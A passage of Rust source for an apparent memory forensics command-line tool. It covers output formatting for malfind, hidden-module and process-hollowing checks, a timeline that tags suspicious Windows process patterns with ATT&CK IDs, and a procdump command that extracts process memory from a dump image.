                "Process",
                "Start",
                "End",
                "Protection",
                "Private",
            ]);
            for v in vads {
                table.add_row(vec![
                    format!("{}", v.pid),
                    v.image_name.clone(),
                    format!("{:#x}", v.start_vaddr),
                    format!("{:#x}", v.end_vaddr),
                    v.protection_str.clone(),
                    if v.is_private { "Yes" } else { "No" }.to_string(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} VAD entries", vads.len());
        }
        OutputFormat::Json => {
            for v in vads {
                let json = serde_json::json!({
                    "pid": v.pid,
                    "image_name": v.image_name,
                    "start_vaddr": format!("{:#x}", v.start_vaddr),
                    "end_vaddr": format!("{:#x}", v.end_vaddr),
                    "protection": v.protection_str,
                    "is_private": v.is_private,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,start_vaddr,end_vaddr,protection,is_private");
            for v in vads {
                println!(
                    "{},{},{:#x},{:#x},{},{}",
                    v.pid, v.image_name, v.start_vaddr, v.end_vaddr, v.protection_str, v.is_private
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows malfind
// ---------------------------------------------------------------------------

fn print_windows_malfind(findings: &[memf_windows::WinMalfindInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
                "Process",
                "Start",
                "End",
                "Protection",
                "Header",
            ]);
            for f in findings {
                let hex_header: String = f.first_bytes.iter().fold(String::new(), |mut s, b| {
                    write!(s, "{b:02x}").unwrap();
                    s
                });
                table.add_row(vec![
                    format!("{}", f.pid),
                    f.image_name.clone(),
                    format!("{:#x}", f.start_vaddr),
                    format!("{:#x}", f.end_vaddr),
                    f.protection_str.clone(),
                    hex_header,
                ]);
            }
            println!("{table}");
            if findings.is_empty() {
                println!("\nNo suspicious memory regions found.");
            } else {
                println!(
                    "\nTotal: {} suspicious regions (private + RWX)",
                    findings.len()
                );
            }
        }
        OutputFormat::Json => {
            for f in findings {
                let hex_header: String = f.first_bytes.iter().fold(String::new(), |mut s, b| {
                    write!(s, "{b:02x}").unwrap();
                    s
                });
                let json = serde_json::json!({
                    "pid": f.pid,
                    "image_name": f.image_name,
                    "start_vaddr": format!("{:#x}", f.start_vaddr),
                    "end_vaddr": format!("{:#x}", f.end_vaddr),
                    "protection": f.protection_str,
                    "header_hex": hex_header,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,start_vaddr,end_vaddr,protection,header_hex");
            for f in findings {
                let hex_header: String = f.first_bytes.iter().fold(String::new(), |mut s, b| {
                    write!(s, "{b:02x}").unwrap();
                    s
                });
                println!(
                    "{},{},{:#x},{:#x},{},{}",
                    f.pid, f.image_name, f.start_vaddr, f.end_vaddr, f.protection_str, hex_header
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — LdrModules cross-reference
// ---------------------------------------------------------------------------

fn print_ldr_modules(mods: &[(u64, String, memf_windows::LdrModuleInfo)], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID", "Process", "Base", "InLoad", "InMem", "InInit", "DLL Path",
            ]);
            for (pid, image_name, m) in mods {
                let flag = |b: bool| if b { "True" } else { "False" };
                table.add_row(vec![
                    format!("{pid}"),
                    image_name.clone(),
                    format!("{:#x}", m.base_addr),
                    flag(m.in_load).to_string(),
                    flag(m.in_mem).to_string(),
                    flag(m.in_init).to_string(),
                    if m.full_path.is_empty() {
                        m.name.clone()
                    } else {
                        m.full_path.clone()
                    },
                ]);
            }
            println!("{table}");
            let hidden = mods
                .iter()
                .filter(|(_, _, m)| !m.in_load || !m.in_mem || !m.in_init)
                .count();
            if hidden > 0 {
                println!(
                    "\nTotal: {} modules, {} potentially hidden (missing from one or more lists)",
                    mods.len(),
                    hidden
                );
            } else if mods.is_empty() {
                println!("\nNo user-mode modules found.");
            } else {
                println!(
                    "\nTotal: {} modules, all present in all 3 lists",
                    mods.len()
                );
            }
        }
        OutputFormat::Json => {
            for (pid, image_name, m) in mods {
                let json = serde_json::json!({
                    "pid": pid,
                    "image_name": image_name,
                    "base_addr": format!("{:#x}", m.base_addr),
                    "name": m.name,
                    "full_path": m.full_path,
                    "in_load": m.in_load,
                    "in_mem": m.in_mem,
                    "in_init": m.in_init,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,base_addr,name,full_path,in_load,in_mem,in_init");
            for (pid, image_name, m) in mods {
                let escaped = m.full_path.replace('"', "\"\"");
                println!(
                    "{},{},{:#x},{},\"{}\",{},{},{}",
                    pid, image_name, m.base_addr, m.name, escaped, m.in_load, m.in_mem, m.in_init
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — process hollowing
// ---------------------------------------------------------------------------

fn print_hollowing(findings: &[memf_windows::WinHollowingInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
                "Process",
                "ImageBase",
                "MZ",
                "PE",
                "PE SizeOfImage",
                "LDR SizeOfImage",
                "Suspicious",
                "Reason",
            ]);
            for f in findings {
                let flag = |b: bool| if b { "Yes" } else { "No" };
                table.add_row(vec![
                    format!("{}", f.pid),
                    f.image_name.clone(),
                    format!("{:#x}", f.image_base),
                    flag(f.has_mz).to_string(),
                    flag(f.has_pe).to_string(),
                    format!("{:#x}", f.pe_size_of_image),
                    format!("{:#x}", f.ldr_size_of_image),
                    flag(f.suspicious).to_string(),
                    if f.reason.is_empty() {
                        "-".to_string()
                    } else {
                        f.reason.clone()
                    },
                ]);
            }
            println!("{table}");
            let suspicious_count = findings.iter().filter(|f| f.suspicious).count();
            if suspicious_count > 0 {
                println!(
                    "\nTotal: {} processes checked, {} suspicious (possible hollowing)",
                    findings.len(),
                    suspicious_count
                );
            } else if findings.is_empty() {
                println!("\nNo user-mode processes with PEB found.");
            } else {
                println!(
                    "\nTotal: {} processes checked, no hollowing detected",
                    findings.len()
                );
            }
        }
        OutputFormat::Json => {
            for f in findings {
                let json = serde_json::json!({
                    "pid": f.pid,
                    "image_name": f.image_name,
                    "image_base": format!("{:#x}", f.image_base),
                    "has_mz": f.has_mz,
                    "has_pe": f.has_pe,
                    "pe_size_of_image": format!("{:#x}", f.pe_size_of_image),
                    "ldr_size_of_image": format!("{:#x}", f.ldr_size_of_image),
                    "suspicious": f.suspicious,
                    "reason": f.reason,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,image_base,has_mz,has_pe,pe_size_of_image,ldr_size_of_image,suspicious,reason");
            for f in findings {
                let escaped = f.reason.replace('"', "\"\"");
                println!(
                    "{},{},{:#x},{},{},{:#x},{:#x},{},\"{}\"",
                    f.pid,
                    f.image_name,
                    f.image_base,
                    f.has_mz,
                    f.has_pe,
                    f.pe_size_of_image,
                    f.ldr_size_of_image,
                    f.suspicious,
                    escaped
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows token privileges
// ---------------------------------------------------------------------------

fn print_windows_privileges(tokens: &[memf_windows::WinTokenInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Process", "User SID", "Enabled Privileges"]);
            for t in tokens {
                let privs = if t.privilege_names.is_empty() {
                    "(none)".to_string()
                } else {
                    t.privilege_names.join(", ")
                };
                let sid = if t.user_sid.is_empty() {
                    "-".to_string()
                } else {
                    t.user_sid.clone()
                };
                table.add_row(vec![format!("{}", t.pid), t.image_name.clone(), sid, privs]);
            }
            println!("{table}");
            let elevated: Vec<_> = tokens
                .iter()
                .filter(|t| t.privilege_names.contains(&"SeDebugPrivilege".to_string()))
                .collect();
            if elevated.is_empty() {
                println!("\nTotal: {} processes", tokens.len());
            } else {
                println!(
                    "\nTotal: {} processes ({} with SeDebugPrivilege)",
                    tokens.len(),
                    elevated.len()
                );
            }
        }
        OutputFormat::Json => {
            for t in tokens {
                let json = serde_json::json!({
                    "pid": t.pid,
                    "image_name": t.image_name,
                    "user_sid": t.user_sid,
                    "privileges_enabled": format!("{:#x}", t.privileges_enabled),
                    "privileges_present": format!("{:#x}", t.privileges_present),
                    "privilege_names": t.privilege_names,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!(
                "pid,image_name,user_sid,privileges_enabled,privileges_present,privilege_names"
            );
            for t in tokens {
                let privs = t.privilege_names.join(";");
                println!(
                    "{},{},{},{:#x},{:#x},\"{}\"",
                    t.pid,
                    t.image_name,
                    t.user_sid,
                    t.privileges_enabled,
                    t.privileges_present,
                    privs
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Timeline
// ---------------------------------------------------------------------------

/// A single timestamped event for the unified timeline.
#[derive(Debug, Clone)]
struct TimelineEvent {
    /// Unix epoch seconds of the event.
    timestamp_secs: i64,
    /// Human-readable UTC timestamp.
    timestamp: String,
    /// Event category: "process_create", "process_exit", "process_start",
    /// "connection_create", "thread_create", "bash_command", "dll_load".
    event_type: String,
    /// Process ID associated with the event.
    pid: u64,
    /// Description of the event source.
    description: String,
    /// Suspicious/notable tags (e.g., "singleton-duplicate:T1036.005", "parent-child-violation:T1036.005").
    tags: Vec<String>,
}

/// Convert a Windows FILETIME to Unix epoch seconds.
/// Returns `None` for zero or pre-1970 values.
fn filetime_to_unix(ft: u64) -> Option<i64> {
    if ft == 0 || ft < FILETIME_UNIX_DIFF {
        return None;
    }
    Some(i64::try_from((ft - FILETIME_UNIX_DIFF) / 10_000_000).unwrap_or(i64::MAX))
}

/// Build timeline events from Windows process and connection data.
fn build_windows_timeline(
    procs: &[memf_windows::WinProcessInfo],
    conns: &[memf_windows::WinConnectionInfo],
) -> Vec<TimelineEvent> {
    let mut events = Vec::new();

    for p in procs {
        if let Some(ts) = filetime_to_unix(p.create_time) {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "process_create".into(),
                pid: p.pid,
                description: format!("{} (PID {})", p.image_name, p.pid),
                tags: vec![],
            });
        }
        if let Some(ts) = filetime_to_unix(p.exit_time) {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "process_exit".into(),
                pid: p.pid,
                description: format!("{} (PID {})", p.image_name, p.pid),
                tags: vec![],
            });
        }
    }

    for c in conns {
        if let Some(ts) = filetime_to_unix(c.create_time) {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "connection_create".into(),
                pid: c.pid,
                description: format!(
                    "TCP {}:{} -> {}:{} ({})",
                    c.local_addr, c.local_port, c.remote_addr, c.remote_port, c.process_name
                ),
                tags: vec![],
            });
        }
    }

    events.sort_by_key(|e| e.timestamp_secs);
    events
}

/// Build timeline events from Linux process data.
/// Requires `boot_epoch` (Unix seconds) to convert boot-relative
/// nanosecond timestamps to absolute wall-clock times.
fn build_linux_timeline(
    procs: &[memf_linux::ProcessInfo],
    boot_epoch: Option<i64>,
) -> Vec<TimelineEvent> {
    let Some(epoch) = boot_epoch else {
        return Vec::new();
    };

    let mut events: Vec<TimelineEvent> = procs
        .iter()
        .map(|p| {
            let ts = epoch + i64::try_from(p.start_time / 1_000_000_000).unwrap_or(i64::MAX);
            TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "process_start".into(),
                pid: p.pid,
                description: format!("{} (PID {})", p.comm, p.pid),
                tags: vec![],
            }
        })
        .collect();

    events.sort_by_key(|e| e.timestamp_secs);
    events
}

/// Build timeline events from Windows thread creation times.
fn build_windows_thread_events(threads: &[memf_windows::WinThreadInfo]) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for t in threads {
        if let Some(ts) = filetime_to_unix(t.create_time) {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "thread_create".into(),
                pid: t.pid,
                description: format!(
                    "TID {} in PID {} (start_addr: {:#x})",
                    t.tid, t.pid, t.start_address
                ),
                tags: vec![],
            });
        }
    }
    events.sort_by_key(|e| e.timestamp_secs);
    events
}

/// Build timeline events from Linux bash history timestamps.
fn build_linux_bash_events(entries: &[memf_linux::BashHistoryInfo]) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for e in entries {
        if let Some(ts) = e.timestamp {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "bash_command".into(),
                pid: e.pid,
                description: format!("[{}] {}", e.comm, e.command),
                tags: vec![],
            });
        }
    }
    events.sort_by_key(|e| e.timestamp_secs);
    events
}

/// Build timeline events for Windows DLL loads (ordered, no timestamp).
///
/// DLLs have no per-DLL timestamp, so each DLL event inherits the owning
/// process's `create_time`. The `load_order` is included in the description.
fn build_windows_dll_events(
    procs: &[memf_windows::WinProcessInfo],
    proc_dlls: &[(u64, Vec<memf_windows::WinDllInfo>)],
) -> Vec<TimelineEvent> {
    let proc_map: std::collections::HashMap<u64, &memf_windows::WinProcessInfo> =
        procs.iter().map(|p| (p.pid, p)).collect();

    let mut events = Vec::new();
    for (pid, dlls) in proc_dlls {
        let proc_ts = proc_map
            .get(pid)
            .and_then(|p| filetime_to_unix(p.create_time));
        let Some(ts) = proc_ts else { continue };

        for dll in dlls {
            events.push(TimelineEvent {
                timestamp_secs: ts,
                timestamp: format_epoch(ts),
                event_type: "dll_load".into(),
                pid: *pid,
                description: format!(
                    "{} (order={}, base={:#x})",
                    dll.name, dll.load_order, dll.base_addr
                ),
                tags: vec![],
            });
        }
    }
    events.sort_by_key(|e| e.timestamp_secs);
    events
}

/// Windows processes that must have exactly one instance (singleton check).
const WIN_SINGLETONS: &[&str] = &[
    "lsass.exe",
    "services.exe",
    "wininit.exe",
    "csrss.exe",
    "smss.exe",
    "lsm.exe",
];

/// Parent-child invariant rules: (child_name, required parent_name).
const WIN_PARENT_RULES: &[(&str, &str)] = &[
    ("svchost.exe", "services.exe"),
    ("lsass.exe", "wininit.exe"),
    ("services.exe", "wininit.exe"),
    ("wininit.exe", "smss.exe"),
];

/// Processes that should never have network connections.
const WIN_NON_NETWORKING: &[&str] = &[
    "notepad.exe",
    "calc.exe",
    "mspaint.exe",
    "write.exe",
    "wordpad.exe",
    "snippingtool.exe",
    "osk.exe",
    "magnify.exe",
    "narrator.exe",
];

/// Collect PID sets for suspicious Windows patterns.
///
/// Returns (singleton_dup_pids, parent_violation_pids, networking_pids,
///          thread_outside_pids, pivot_pids).
fn collect_suspicious_pid_sets(
    procs: &[memf_windows::WinProcessInfo],
    conns: &[memf_windows::WinConnectionInfo],
    threads: &[memf_windows::WinThreadInfo],
    proc_dlls: &[(u64, Vec<memf_windows::WinDllInfo>)],
) -> (
    std::collections::HashSet<u64>,
    std::collections::HashSet<u64>,
    std::collections::HashSet<u64>,
    std::collections::HashSet<(u64, u64)>,
    std::collections::HashSet<u64>,
) {
    // --- 1. Singleton duplication ---
    let mut name_counts: std::collections::HashMap<String, Vec<u64>> =
        std::collections::HashMap::new();
    for p in procs {
        let lower = p.image_name.to_lowercase();
        name_counts.entry(lower).or_default().push(p.pid);
    }
    let mut singleton_dup_pids: std::collections::HashSet<u64> = std::collections::HashSet::new();
    for &name in WIN_SINGLETONS {
        if let Some(pids) = name_counts.get(name) {
            if pids.len() > 1 {
                singleton_dup_pids.extend(pids);
            }
        }
    }

    // --- 2. Parent-child invariant violations ---
    let pid_to_name: std::collections::HashMap<u64, String> = procs
        .iter()
        .map(|p| (p.pid, p.image_name.to_lowercase()))
        .collect();
    let mut parent_violation_pids: std::collections::HashSet<u64> =
        std::collections::HashSet::new();
    for p in procs {
        let child_lower = p.image_name.to_lowercase();
        for &(child_name, parent_name) in WIN_PARENT_RULES {
            if child_lower == child_name {
                let parent_lower = pid_to_name.get(&(p.ppid)).map_or("", String::as_str);
                if parent_lower != parent_name {
                    parent_violation_pids.insert(p.pid);
                }
            }
        }
    }

    // --- 3. Non-networking process with connections ---
    let mut networking_pids: std::collections::HashSet<u64> = std::collections::HashSet::new();
    for c in conns {
        let proc_lower = c.process_name.to_lowercase();
        if WIN_NON_NETWORKING.contains(&proc_lower.as_str()) {
            networking_pids.insert(c.pid);
        }
    }

    // --- 4. Thread start address outside any loaded module ---
    let mut thread_outside_pids: std::collections::HashSet<(u64, u64)> =
        std::collections::HashSet::new();
    let dll_map: std::collections::HashMap<u64, &Vec<memf_windows::WinDllInfo>> =
        proc_dlls.iter().map(|(pid, dlls)| (*pid, dlls)).collect();
    for t in threads {
        if let Some(dlls) = dll_map.get(&t.pid) {
            let in_module = dlls
                .iter()
                .any(|d| t.start_address >= d.base_addr && t.start_address < d.base_addr + d.size);
            if !in_module && t.start_address != 0 {
                thread_outside_pids.insert((t.pid, t.tid));
            }
        }
    }

    // --- 5. Pivot point: process with both listener and outbound ---
    let mut listening_pids: std::collections::HashSet<u64> = std::collections::HashSet::new();
    let mut outbound_pids: std::collections::HashSet<u64> = std::collections::HashSet::new();
    for c in conns {
        match &c.state {
            memf_windows::WinTcpState::Listen => {
                listening_pids.insert(c.pid);
            }
            memf_windows::WinTcpState::Established
            | memf_windows::WinTcpState::SynSent
            | memf_windows::WinTcpState::FinWait1
            | memf_windows::WinTcpState::FinWait2
            | memf_windows::WinTcpState::CloseWait => {
                outbound_pids.insert(c.pid);
            }
            _ => {}
        }
    }
    let pivot_pids: std::collections::HashSet<u64> = listening_pids
        .intersection(&outbound_pids)
        .copied()
        .collect();

    (
        singleton_dup_pids,
        parent_violation_pids,
        networking_pids,
        thread_outside_pids,
        pivot_pids,
    )
}

/// Tag suspicious patterns in Windows timeline events.
///
/// Mutates `events` in-place, appending tags like "singleton-duplicate:T1036.005",
/// "parent-child-violation:T1036.005", "non-networking-process:T1071",
/// "thread-outside-module:T1055", or "pivot-point:T1090".
fn tag_suspicious_windows(
    events: &mut [TimelineEvent],
    procs: &[memf_windows::WinProcessInfo],
    conns: &[memf_windows::WinConnectionInfo],
    threads: &[memf_windows::WinThreadInfo],
    proc_dlls: &[(u64, Vec<memf_windows::WinDllInfo>)],
) {
    let (
        singleton_dup_pids,
        parent_violation_pids,
        networking_pids,
        thread_outside_pids,
        pivot_pids,
    ) = collect_suspicious_pid_sets(procs, conns, threads, proc_dlls);

    // --- Apply tags to events ---
    for event in events.iter_mut() {
        if singleton_dup_pids.contains(&event.pid) {
            event.tags.push("singleton-duplicate:T1036.005".into());
        }
        if parent_violation_pids.contains(&event.pid) {
            event.tags.push("parent-child-violation:T1036.005".into());
        }
        if networking_pids.contains(&event.pid) {
            event.tags.push("non-networking-process:T1071".into());
        }
        if pivot_pids.contains(&event.pid) {
            event.tags.push("pivot-point:T1090".into());
        }
        // Thread-outside-module: tag thread_create events specifically
        if event.event_type == "thread_create" {
            // Extract TID from description "TID <tid> in PID <pid> ..."
            if let Some(tid_str) = event.description.strip_prefix("TID ") {
                if let Some(tid) = tid_str
                    .split_whitespace()
                    .next()
                    .and_then(|s| s.parse::<u64>().ok())
                {
                    if thread_outside_pids.contains(&(event.pid, tid)) {
                        event.tags.push("thread-outside-module:T1055".into());
                    }
                }
            }
        }
    }
}

/// Print timeline events in Sleuthkit bodyfile format.
///
/// Bodyfile format: `MD5|name|inode|mode|UID|GID|size|atime|mtime|ctime|crtime`
/// We map timeline events into this format with:
/// - MD5: "0" (no hash)
/// - name: `[event_type] description {tags}`
/// - inode/mode/UID/GID/size: 0
/// - atime/mtime: 0
/// - ctime: `timestamp_secs` (change time)
/// - crtime: `timestamp_secs` (creation time, for process_create/thread_create)
fn print_timeline_bodyfile(events: &[TimelineEvent]) {
    for e in events {
        let tags_suffix = if e.tags.is_empty() {
            String::new()
        } else {
            format!(" {{{}}}", e.tags.join(","))
        };
        let name = format!(
            "[{}] PID:{} {}{}",
            e.event_type, e.pid, e.description, tags_suffix
        );
        // atime=0, mtime=0, ctime=timestamp, crtime=timestamp
        println!(
            "0|{}|0|0|0|0|0|0|0|{}|{}",
            name, e.timestamp_secs, e.timestamp_secs
        );
    }
}

/// Print a sorted timeline to stdout.
fn print_timeline(events: &[TimelineEvent], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            println!(
                "{:<26} {:<20} {:>8}  DESCRIPTION  TAGS",
                "TIMESTAMP", "EVENT", "PID"
            );
            for e in events {
                let tags_str = if e.tags.is_empty() {
                    String::new()
                } else {
                    format!("[{}]", e.tags.join(", "))
                };
                println!(
                    "{:<26} {:<20} {:>8}  {}  {}",
                    e.timestamp, e.event_type, e.pid, e.description, tags_str
                );
            }
        }
        OutputFormat::Json => {
            for e in events {
                let json = serde_json::json!({
                    "timestamp": e.timestamp,
                    "timestamp_secs": e.timestamp_secs,
                    "event_type": e.event_type,
                    "pid": e.pid,
                    "description": e.description,
                    "tags": e.tags,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("timestamp,timestamp_secs,event_type,pid,description,tags");
            for e in events {
                let tags_str = e.tags.join(";");
                println!(
                    "{},{},{},{},\"{}\",\"{}\"",
                    e.timestamp, e.timestamp_secs, e.event_type, e.pid, e.description, tags_str
                );
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn cmd_timeline(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3: Option<u64>,
    btime: Option<i64>,
    bodyfile: bool,
    raw_fallback: bool,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3, raw_fallback)?;

    let events = match ctx.os {
        OsProfile::Windows => {
            let ps_head = ctx
                .ps_active_process_head
                .context("missing PsActiveProcessHead; provide via symbols or dump metadata")?;
            let procs = memf_windows::process::walk_processes(&reader, ps_head)
                .context("failed to walk Windows processes")?;

            // Try to get network connections; non-fatal if symbols are missing.
            let conns = (|| -> Result<Vec<memf_windows::WinConnectionInfo>> {
                let tcp_ptr_sym = reader
                    .symbols()
                    .symbol_address("TcpBTable")
                    .context("missing 'TcpBTable' symbol")?;
                let ptr_bytes = reader
                    .read_bytes(tcp_ptr_sym, 8)
                    .context("failed to read TcpBTable pointer")?;
                let table_vaddr = u64::from_le_bytes(ptr_bytes[..8].try_into().expect("8 bytes"));

                let tcp_size_sym = reader
                    .symbols()
                    .symbol_address("TcpBTableSize")
                    .context("missing 'TcpBTableSize' symbol")?;
                let size_bytes = reader
                    .read_bytes(tcp_size_sym, 4)
                    .context("failed to read TcpBTableSize")?;
                let bucket_count = u32::from_le_bytes(size_bytes[..4].try_into().expect("4 bytes"));

                memf_windows::network::walk_tcp_endpoints(&reader, table_vaddr, bucket_count)
                    .context("failed to walk Windows TCP endpoints")
            })()
            .unwrap_or_else(|e| {
                eprintln!("warning: could not walk network connections: {e}");
                Vec::new()
            });

            // Walk threads for all processes (non-fatal per process).
            let mut all_threads = Vec::new();
            for p in &procs {
                if let Ok(threads) = memf_windows::thread::walk_threads(&reader, p.vaddr, p.pid) {
                    all_threads.extend(threads);
                }
            }

            // Walk DLLs for all processes (non-fatal per process).
            let mut proc_dlls: Vec<(u64, Vec<memf_windows::WinDllInfo>)> = Vec::new();
            for p in &procs {
                if p.peb_addr != 0 {
                    if let Ok(dlls) = memf_windows::dll::walk_dlls(&reader, p.peb_addr) {
                        proc_dlls.push((p.pid, dlls));
                    }
                }
            }

            let mut events = build_windows_timeline(&procs, &conns);
            events.extend(build_windows_thread_events(&all_threads));
            events.extend(build_windows_dll_events(&procs, &proc_dlls));
            events.sort_by_key(|e| e.timestamp_secs);
            tag_suspicious_windows(&mut events, &procs, &conns, &all_threads, &proc_dlls);
            events
        }
        OsProfile::Linux => {
            let procs = memf_linux::process::walk_processes(&reader)
                .context("failed to walk Linux processes")?;

            // Collect boot time estimates.
            let mut estimates = Vec::new();
            match memf_linux::boot_time::extract_boot_time(&reader) {
                Ok(est) => estimates.push(est),
                Err(e) => {
                    eprintln!("warning: could not extract boot time from kernel timekeeper: {e}");
                }
            }
            if let Some(epoch) = btime {
                estimates.push(memf_linux::BootTimeEstimate {
                    source: memf_linux::BootTimeSource::UserProvided,
                    boot_epoch_secs: epoch,
                });
            }
            let boot_info = memf_linux::BootTimeInfo::from_estimates(estimates);
            if boot_info.inconsistent {
                eprintln!(
                    "warning: boot time sources differ by {}s",
                    boot_info.max_drift_secs
                );
            }

            // Walk bash history (non-fatal).
            let bash_entries = memf_linux::bash::walk_bash_history(&reader).unwrap_or_else(|e| {
                eprintln!("warning: could not walk bash history: {e}");
                Vec::new()
            });

            let mut events = build_linux_timeline(&procs, boot_info.best_estimate);
            events.extend(build_linux_bash_events(&bash_entries));
            events.sort_by_key(|e| e.timestamp_secs);
            events
        }
        OsProfile::MacOs => anyhow::bail!("macOS timeline not yet supported"),
    };

    if events.is_empty() {
        eprintln!("warning: no timeline events found");
    }

    if bodyfile {
        print_timeline_bodyfile(&events);
    } else {
        print_timeline(&events, output);
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Procdump
// ---------------------------------------------------------------------------

/// Dump process virtual memory regions to a writer.
///
/// Iterates over the given address ranges, reads each 4KB page from the
/// VAS, and writes it to the output. Unmapped pages are written as zeros.
/// Returns the total number of bytes written.
fn dump_process_memory<W: std::io::Write>(
    vas: &VirtualAddressSpace<impl PhysicalMemoryProvider>,
    ranges: &[(u64, u64)],
    writer: &mut W,
) -> Result<u64> {
    const PAGE_SIZE: u64 = 4096;
    let zero_page = [0u8; 4096];
    let mut total: u64 = 0;

    for &(start, end) in ranges {
        let mut vaddr = start;
        while vaddr < end {
            let chunk = std::cmp::min(PAGE_SIZE, end - vaddr);
            let mut buf = vec![0u8; chunk as usize];
            if vas.read_virt(vaddr, &mut buf).is_ok() {
                writer.write_all(&buf)?;
            } else {
                writer.write_all(&zero_page[..chunk as usize])?;
            }
            total += chunk;
            vaddr += chunk;
        }
    }
    Ok(total)
}

fn cmd_procdump(
    dump: &Path,
    symbols_path: Option<&Path>,
    cr3_override: Option<u64>,
    pid: u64,
    output_dir: &Path,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, false)?;

    let (process_name, process_cr3, ranges) = match ctx.os {
        OsProfile::Linux => {
            let procs = memf_linux::process::walk_processes(&reader)
                .context("failed to walk Linux processes")?;
            let proc = procs
                .iter()
                .find(|p| p.pid == pid)
                .ok_or_else(|| anyhow::anyhow!("PID {pid} not found"))?;
            let proc_cr3 = proc
                .cr3
                .ok_or_else(|| anyhow::anyhow!("PID {pid} has no CR3 (kernel thread?)"))?;
            let vmas = memf_linux::maps::walk_process_maps(&reader, proc.vaddr)
                .context("failed to walk VMAs")?;
            let ranges: Vec<(u64, u64)> = vmas.iter().map(|v| (v.start, v.end)).collect();
            (proc.comm.clone(), proc_cr3, ranges)
        }
        OsProfile::Windows => {
            let ps_head = ctx
                .ps_active_process_head
                .context("missing PsActiveProcessHead")?;
            let procs = memf_windows::process::walk_processes(&reader, ps_head)
                .context("failed to walk Windows processes")?;
            let proc = procs
                .iter()
                .find(|p| p.pid == pid)
                .ok_or_else(|| anyhow::anyhow!("PID {pid} not found"))?;
            let vads = memf_windows::vad::walk_vad_tree(&reader, proc.vaddr, pid, &proc.image_name)
                .context("failed to walk VADs")?;
            let ranges: Vec<(u64, u64)> =
                vads.iter().map(|v| (v.start_vaddr, v.end_vaddr)).collect();
            (proc.image_name.clone(), proc.cr3, ranges)
        }
        OsProfile::MacOs => anyhow::bail!("macOS procdump not yet supported"),
    };

    if ranges.is_empty() {
        eprintln!("warning: no memory regions found for PID {pid}");
        return Ok(());
    }

    // Create a process-specific VAS using the process's own CR3.
    let proc_reader = reader.with_cr3(process_cr3);
    let proc_vas = proc_reader.vas();

    let out_path = output_dir.join(format!("{pid}.{process_name}.dmp"));
    let mut file = std::fs::File::create(&out_path)
        .with_context(|| format!("failed to create {}", out_path.display()))?;

    let written = dump_process_memory(proc_vas, &ranges, &mut file)?;
    eprintln!(
        "dumped PID {pid} ({process_name}): {} bytes ({} regions) -> {}",
        written,
        ranges.len(),
        out_path.display()
    );
    Ok(())
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

#[allow(clippy::cast_precision_loss)]
fn format_size(bytes: u64) -> String {
    if bytes >= 1024 * 1024 * 1024 {
        format!("{:.2} GB", bytes as f64 / (1024.0 * 1024.0 * 1024.0))
    } else if bytes >= 1024 * 1024 {
        format!("{:.2} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.2} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn make_temp_lime_dump(suffix: &str) -> std::path::PathBuf {
        use memf_format::test_builders::LimeBuilder;

        let dump = LimeBuilder::new().add_range(0x1000, &[0xAA; 4096]).build();
        let path = std::env::temp_dir().join(format!("memf_tdd_cli_{suffix}.lime"));
        std::fs::write(&path, &dump).unwrap();
        path
    }

    fn make_temp_isf_file(suffix: &str) -> std::path::PathBuf {
        use memf_symbols::test_builders::IsfBuilder;

        let isf = IsfBuilder::linux_process_preset().build_bytes();
        let path = std::env::temp_dir().join(format!("memf_tdd_cli_{suffix}.json"));
        std::fs::write(&path, &isf).unwrap();
        path
    }

    #[test]
    fn load_symbols_no_files_errors() {
        let dir = std::env::temp_dir().join("memf_tdd_cli_empty_symbols");
